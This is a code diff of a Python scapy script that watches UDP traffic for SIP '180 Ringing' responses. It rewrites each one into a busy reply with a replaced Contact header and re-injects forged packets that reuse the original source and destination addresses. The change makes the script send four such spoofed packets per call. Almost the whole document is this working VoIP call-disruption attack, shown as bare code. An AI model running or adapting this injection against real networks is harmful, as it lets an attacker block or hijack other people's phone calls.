@@ -1,7 +1,3 @@
-#!/usr/bin/python3
-
-# -*- coding: utf-8 -*-
-
 from scapy.all import sniff, Ether, IP, UDP, sendp, ICMP, rdpcap, Raw
 import scapy.fields
 import re
@@ -14,9 +10,12 @@ def traffic_parser(packet):
 
     payload = packet[UDP].payload.load
 
-    print(type(payload))
-    print(payload.decode("utf-8"))
-    payload = payload.decode("utf-8")
+    print(payload)
+    print(payload.decode("utf-8-sig"))
+    payload = payload.decode("utf-8-sig")
+
+    print("----------------------------------------------------------------------")
+
 
     header=re.findall("Ringing", str(payload))
     if header:
@@ -32,43 +31,46 @@ def traffic_parser(packet):
         udp_attributes={}
         udp_attributes['sport']=packet[2].sport
         udp_attributes['dport']=packet[2].dport
-        udp_attributes['len']=444
+        # udp_attributes['len']=444
+        udp_attributes['len']=491
     
         udp = UDP_layer(udp_attributes)
 
 
         # print(payload)
         
-        # Implement packet modification
-        payload = payload.replace("SIP/2.0 180 Ringing", BUSY_1, 1)
-        payload = re.sub("Contact\:.*>", BUSY_2, payload,1)
-        payload = payload.replace("Raw(load=b\'", '', 1)
-        payload = re.sub("\'\)$", '', payload, 1)
-        # print(payload.replace('\\\\', '\\'))
-        payload = payload.replace("\\\\", "\\")
 
-        # for incr in range(1,5):
-        ip_attributes={}
-        ip_attributes['version']=packet[1].version
-        ip_attributes['tos']=packet[1].tos
-        ip_attributes['len']=464 #packet[1].len
-        # ip_attributes['id']=packet[1].id+incr
-        ip_attributes['id']=0
-        ip_attributes['flags']=packet[1].flags
-        ip_attributes['frag']=packet[1].frag
-        ip_attributes['ttl']=packet[1].ttl
-        ip_attributes['proto']=packet[1].proto
-        ip_attributes['src']=packet[1].src
-        ip_attributes['dst']=packet[1].dst
+        for incr in range(1,5):
 
-        ip = IP_layer(ip_attributes)
+            # Implement packet modification
+            payload = payload.replace("SIP/2.0 180 Ringing", BUSY_1, 1)
+            payload = re.sub("Contact\:.*>", BUSY_2, payload,1)
+            payload = payload.replace("Raw(load=b\'", '', 1)
+            payload = re.sub("\'\)$", '', payload, 1)
+            # print(payload.replace('\\\\', '\\'))
+            payload = payload.replace("\\\\", "\\")
 
-        sendp(eth/ip/udp/Raw(load=payload))
 
-        print(type(payload))
-        print(payload)
-        # print(Raw(load=payload))
-        print("\n")
+            ip_attributes={}
+            ip_attributes['version']=packet[1].version
+            ip_attributes['tos']=packet[1].tos
+            ip_attributes['len']=511 #packet[1].len
+            ip_attributes['id']=packet[1].id+incr
+            # ip_attributes['id']=0
+            ip_attributes['flags']=packet[1].flags
+            ip_attributes['frag']=packet[1].frag
+            ip_attributes['ttl']=packet[1].ttl
+            ip_attributes['proto']=packet[1].proto
+            ip_attributes['src']=packet[1].src
+            ip_attributes['dst']=packet[1].dst
+
+            ip = IP_layer(ip_attributes)
+
+            sendp(eth/ip/udp/Raw(load=payload))
+
+            payload = payload + "\r\n\r"
+            print(payload)
+            # print(Raw(load=payload))
 
 def Ether_layer(attributes):
     layer2=Ether()
